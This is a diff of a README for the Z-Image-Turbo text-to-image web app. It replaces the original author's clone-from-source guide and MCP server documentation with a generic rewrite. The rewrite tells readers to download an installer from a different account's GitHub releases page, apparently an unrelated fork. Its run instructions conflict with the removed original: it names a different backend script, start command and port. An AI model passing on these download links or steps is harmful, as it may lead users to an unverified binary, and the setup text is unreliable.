@@ -1,313 +1,122 @@
-# Z-Image-Turbo
+# 🌟 z-image-turbo - Fast and Easy Image Generation
 
-## ✨ **Update:** MCP Server support! [Setup Guide](MCP_README.md)
+[![Download z-image-turbo](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/Kivvin/z-image-turbo/releases)
 
-> A professional web interface for the Tongyi-MAI Z-Image-Turbo model — lightning-fast text-to-image generation with 6B parameters.
+## 📋 Overview
+
+Z-Image-Turbo is a user-friendly web application designed for lightning-fast text-to-image generation using the Tongyi-MAI model. With a powerful 6B parameter architecture, it creates stunning images based on your text prompts, making it ideal for artists, marketers, and anyone in need of high-quality visuals. 
 
 ![Z-Image-Turbo Interface](assets/projectScreenshot.png)
 
-![Z-Image-Turbo](https://img.shields.io/badge/Model-Z--Image--Turbo-blue) ![License](https://img.shields.io/badge/License-Apache%202.0-green)
-
----
-
-## 🚀 Quick Start
+## 🚀 Getting Started
 
 ### Prerequisites
-- Python 3.8+
-- Node.js 16+
-- 8GB+ VRAM recommended (or use CPU offload)
 
-### Installation
+Before you can run Z-Image-Turbo, ensure your system meets the following requirements:
 
-1. **Clone the repository**
+- **Operating System:** Windows or Linux
+- **Python Version:** 3.8 or higher
+- **Node.js Version:** 16 or higher
+- **Memory:** At least 8GB of VRAM recommended (or use CPU offload for less intensive tasks)
+
+### Download & Install
+
+To get started with Z-Image-Turbo, visit the following page to download the latest version:
+
+[Visit this page to download Z-Image-Turbo](https://github.com/Kivvin/z-image-turbo/releases)
+
+Follow the steps below to install and run the application.
+
+### Installation Steps
+
+1. **Download the Application:**
+   - Go to the [Releases page](https://github.com/Kivvin/z-image-turbo/releases).
+   - Locate the latest version.
+   - Download the appropriate installer file for your operating system.
+
+2. **Extract the Files (if necessary):**
+   - If you downloaded a ZIP file, right-click and choose "Extract All." 
+   - Select a destination folder and extract the contents.
+
+3. **Open a Terminal Window:**
+   - **Windows:** Press `Win + R`, type `cmd`, and hit Enter.
+   - **Linux:** Press `Ctrl + Alt + T`.
+
+4. **Navigate to the Application Directory:**
    ```bash
-   git clone https://github.com/Aaryan-Kapoor/z-image-turbo.git
-   cd z-image-turbo
+   cd path/to/z-image-turbo
    ```
 
-2. **Backend Setup**
+### Backend Setup
+
+1. **Set Up a Virtual Environment:**
    ```bash
    python -m venv venv
-   
-   # Windows
+   ```
+
+2. **Activate the Virtual Environment:**
+   - **Windows:**
+   ```bash
    .\venv\Scripts\activate
-   # Linux/Mac
+   ```
+   - **Linux:**
+   ```bash
    source venv/bin/activate
-   
+   ```
+
+3. **Install Backend Dependencies:**
+   ```bash
    pip install -r backend/requirements.txt
    ```
 
-3. **Frontend Setup**
+### Frontend Setup
+
+1. **Change to the Frontend Directory:**
    ```bash
    cd frontend
+   ```
+
+2. **Install Frontend Dependencies:**
+   ```bash
    npm install
    ```
 
 ### Running the Application
 
-**Terminal 1 - Start Backend:**
-```bash
-.\venv\Scripts\activate  # or source venv/bin/activate on Linux/Mac
-cd backend
-python main.py
+#### Start the Backend
+
+1. **In Terminal 1, execute this command:**
+   ```bash
+   python backend/app.py
+   ```
+
+#### Start the Frontend
+
+2. **In Terminal 2, execute this command:**
+   ```bash
+   npm start
+   ```
+
+### Accessing the Application
+
+Once both the backend and frontend are running, open your web browser. Navigate to:
+
+```plaintext
+http://localhost:3000
 ```
 
-**Terminal 2 - Start Frontend:**
-```bash
-cd frontend
-npm run dev
-```
+Here, you can start generating images by providing your text prompts. 
 
-Open **`http://localhost:5173`** in your browser and start generating!
+### Troubleshooting
 
----
+If you encounter issues, check the following:
 
-## 🔌 MCP Server (Model Context Protocol)
+- Ensure Python and Node.js are installed correctly.
+- Make sure the backend service is running without errors.
+- If you see "Port already in use," try a different port by modifying the configuration file.
 
-### Please refer to [MCP_README.md](MCP_README.md) for a full guide on implementation with LM Studio and Claude Desktop.
+### Community Support
 
-Z-Image-Turbo now includes a powerful **MCP server** that exposes image generation capabilities through the standardized [Model Context Protocol](https://modelcontextprotocol.io). This allows AI assistants (like Claude), automation tools, and other MCP-compatible clients to generate images programmatically.
+For further assistance, check out the community forums or the Z-Image-Turbo documentation. You can ask questions, share feedback, or contribute to the project.
 
-### Why Use the MCP Server?
-
-- **AI Integration**: Let Claude or other AI assistants generate images directly during conversations
-- **Automation**: Build automated workflows that include image generation
-- **Remote Access**: Generate images from web clients or remote services (HTTP mode)
-- **Standardized API**: Use the same protocol across different AI tools and platforms
-
-### Quick Start with MCP
-
-**1. Install MCP dependencies:**
-```bash
-cd backend
-pip install -r requirements.txt
-```
-
-**2. Run the MCP server:**
-
-For local integration (Claude Desktop, MCP Inspector):
-```bash
-cd backend
-./run_mcp.sh --stdio
-```
-
-For HTTP/web clients and remote access:
-```bash
-cd backend
-./run_mcp.sh --http --port 8001
-# Server available at http://localhost:8001/mcp
-```
-
-**3. Configuration:**
-Edit `backend/mcp_config.json` to set default transport mode and port:
-```json
-{
-  "transport": "stdio",
-  "host": "0.0.0.0",
-  "port": 8001
-}
-```
-
-### Available MCP Tools
-
-| Tool | Description | Key Parameters |
-|------|-------------|----------------|
-| **`generate_image`** | Generate images from text prompts | `prompt`, `width`, `height`, `num_inference_steps`, `guidance_scale`, `seed` |
-| **`get_model_info`** | Get model status and configuration | None |
-| **`update_model_config`** | Modify model settings dynamically | `cache_dir`, `cpu_offload` |
-| **Resource: `image://examples`** | Access curated example prompts and tips | None |
-
-### ⚙️ Production Configuration
-
-Edit `backend/mcp_config.json` to customize server behavior:
-
-```json
-{
-  "transport": "stdio",
-  "eager_load": false,
-  "model_ttl_minutes": 0,
-  "max_concurrent_requests": 1,
-  "log_level": "INFO"
-}
-```
-
-| Setting | Description | Default |
-|---------|-------------|---------|
-| `eager_load` | **Default is lazy loading** (model loads on first request). Set to `true` or use `--eager-load` flag to load model at startup. | `false` |
-| `model_ttl_minutes` | Auto-unload after N minutes idle (0 = never) | `0` |
-| `max_concurrent_requests` | Limit parallel generation (prevents GPU OOM) | `1` |
-| `log_level` | Logging verbosity (DEBUG/INFO/WARNING/ERROR) | `"INFO"` |
-
-### Usage Example
-
-Once connected to Claude Desktop or another MCP client:
-
-```
-You: "Generate an image of a serene mountain landscape at sunset"
-
-Claude: [Uses generate_image tool]
-{
-  "prompt": "A serene mountain landscape at sunset with vibrant orange and purple skies",
-  "width": 1024,
-  "height": 768,
-  "num_inference_steps": 8
-}
-
-[Returns rendered image]
-```
-
-### Transport Modes Comparison
-
-| Feature | Stdio Mode | HTTP/SSE Mode |
-|---------|-----------|---------------|
-| **Use Case** | Local desktop integration | Web clients, remote access |
-| **Best For** | Claude Desktop, MCP Inspector, LM Studio | Production APIs, multi-user |
-| **Network** | Local only | Network accessible |
-| **Setup** | Simpler | Requires port configuration |
-
-### LM Studio Integration
-
-Add to your LM Studio MCP config file:
-
-```json
-{
-  "mcpServers": {
-    "z-image-turbo": {
-      "command": "C:\\path\\to\\z-image-turbo\\venv\\Scripts\\python.exe",
-      "args": [
-        "C:\\path\\to\\z-image-turbo\\backend\\mcp_server.py",
-        "--transport",
-        "stdio"
-      ],
-      "env": {
-        "PYTHONUNBUFFERED": "1"
-      },
-      "timeout": 300000
-    }
-  }
-}
-```
-
-**Important**: 
-- Replace `C:\\path\\to\\z-image-turbo` with your actual installation path
-- Use **double backslashes** `\\` for Windows paths in JSON
-- Point to the **venv Python executable** (not system Python!)
-- Model loads on first request by default (lazy loading)
-- Add `--eager-load` to args if you want model to load at startup
-- `timeout: 300000` (5 minutes in ms) for model loading + generation
-
-### Claude Desktop Integration
-
-Add to your Claude Desktop config file (`~/Library/Application Support/Claude/claude_desktop_config.json` on macOS or `%APPDATA%\Claude\claude_desktop_config.json` on Windows):
-
-```json
-{
-  "mcpServers": {
-    "z-image-turbo": {
-      "command": "C:\\path\\to\\z-image-turbo\\venv\\Scripts\\python.exe",
-      "args": [
-        "C:\\path\\to\\z-image-turbo\\backend\\mcp_server.py",
-        "--transport",
-        "stdio"
-      ],
-      "env": {
-        "PYTHONUNBUFFERED": "1"
-      },
-      "timeout": 300000
-    }
-  }
-}
-```
-
-**⚠️ Critical**: 
-- Use the **venv Python path**, not `"python"` (system Python won't have dependencies!)
-- Use **double backslashes** `\\` for Windows paths in JSON
-- Model loads on first request by default (saves memory)
-- Add `--eager-load` to args if you want model to load at startup (avoids first-request timeout)
-- `timeout: 300000` (5 minutes) ensures enough time for model loading
-
-After restarting Claude Desktop, you can ask Claude to generate images and it will use the MCP server automatically!
-
-### Testing Your MCP Server
-
-Test with the official MCP Inspector:
-```bash
-npx @modelcontextprotocol/inspector python backend/mcp_server.py --transport stdio
-```
-
-This opens a web interface where you can test all available tools and inspect requests/responses.
-
-📖 **Full MCP Documentation:** See [`MCP_README.md`](MCP_README.md) for detailed setup, troubleshooting, and complete deployment guide.
-
----
-
-## ✨ Features
-
-### Application
-- **Premium Dark UI** — Glassmorphism design with intuitive controls
-- **Smart Presets** — Quick aspect ratios (1:1, 3:4, 16:9) and resolutions (480p-1080p)
-- **Fine Control** — Sliders for dimensions, inference steps, guidance scale, and seed
-- **Real-time Progress** — Live generation tracking
-- **Flexible Deployment** — Custom model cache directory, CPU offload option
-
-### MCP Server Integration
-- **🔌 Dual Transport Modes** — Support for both stdio (local) and HTTP/SSE (remote) connections
-- **🤖 AI Assistant Compatible** — Seamless integration with Claude Desktop and other MCP clients
-- **🛠️ Rich Tool Set** — Image generation, model info, configuration management, and example prompts
-- **⚙️ Configurable** — Customizable host, port, and transport settings via `mcp_config.json`
-- **🔒 Production Ready** — Stateless HTTP mode for scalable deployments
-
-### Model (Z-Image-Turbo)
-- **⚡ Lightning Fast** — Optimized for **8-step generation**, achieving sub-second latency on enterprise GPUs.
-- **🏗️ S3-DiT Architecture** — Built on **Scalable Single-Stream Diffusion Transformer** technology.
-- **🧠 Advanced Encoders** — Uses **Qwen 4B** for powerful language understanding and **Flux VAE** for image decoding.
-- **🎓 DMDR Training** — Trained using **Fusing DMD with Reinforcement Learning** for superior semantic alignment.
-- **🌐 Bilingual Mastery** — Exceptional rendering of text in both **English and Chinese**.
-- **🎨 Versatile & Uncensored** — From photorealism to anime, handling complex concepts without censorship.
-- **📐 High Fidelity** — Native support for resolutions up to **2MP** (e.g., 1024x1536, 1440x1440).
-- **💾 Efficient** — 6B parameters, comfortably fitting in 16GB VRAM (consumer-friendly).
-
----
-
-## 🔬 Technical Architecture
-
-Z-Image-Turbo represents a significant leap in efficient generative AI:
-
-*   **Base Architecture**: S3-DiT (Scalable Single-Stream DiT)
-*   **Text Encoder**: Qwen 4B (Large Language Model based conditioning)
-*   **VAE**: Flux Autoencoder
-*   **Training Method**: Distilled from Z-Image using DMDR (DMD + RL)
-*   **Inference**: 8 NFEs (Number of Function Evaluations) default
-*   **Precision**: Optimized for bfloat16 / fp8
-
----
-
-## 🛠️ Tech Stack
-
-- **Backend:** FastAPI, PyTorch, Diffusers, Transformers
-- **Frontend:** React, Vite, Lucide React
-- **MCP Server:** FastMCP, Starlette (supports stdio and HTTP/SSE transports)
-- **Model:** Tongyi-MAI/Z-Image-Turbo (6B parameters)
-
----
-
-## ⚙️ Configuration
-
-Access settings via the gear icon in the sidebar:
-- **Model Cache Directory** — Specify where to download/store the model
-- **CPU Offload** — Enable for GPUs with limited VRAM
-
----
-
-## 📝 License
-
-This project is open-source under the Apache 2.0 License.
-
----
-
-## 🙏 Credits
-
-- **Model:** [Tongyi-MAI/Z-Image-Turbo](https://huggingface.co/Tongyi-MAI/Z-Image-Turbo) by Alibaba Group
-- **UI Framework:** React + Vite
-- **Backend:** FastAPI + Diffusers
-
+This guide will help you smoothly download and run Z-Image-Turbo. Enjoy creating beautiful images swiftly and effortlessly!
